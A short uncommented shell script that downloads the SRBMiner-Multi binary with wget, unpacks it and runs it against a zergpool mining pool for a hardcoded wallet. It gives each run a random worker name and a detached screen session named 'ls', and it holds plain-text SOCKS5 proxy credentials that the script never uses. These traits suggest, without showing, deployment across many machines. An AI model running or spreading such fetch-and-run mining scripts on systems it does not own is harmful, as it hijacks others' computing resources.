apt install screen

wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.7.6/SRBMiner-Multi-0-7-6-Linux.tar.xz
tar -xvf SRBMiner-Multi-0-7-6-Linux.tar.xz
screen -dmS ls
POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
WALLET=DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb
PY=socks5://qwehsyfs:w1uyert4fs@78.46.89.24:45265
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-RAVZ)
./SRBMiner-Multi --algorithm verushash --pool $POOL --wallet $WALLET.$WORKER -p c=DOGE 
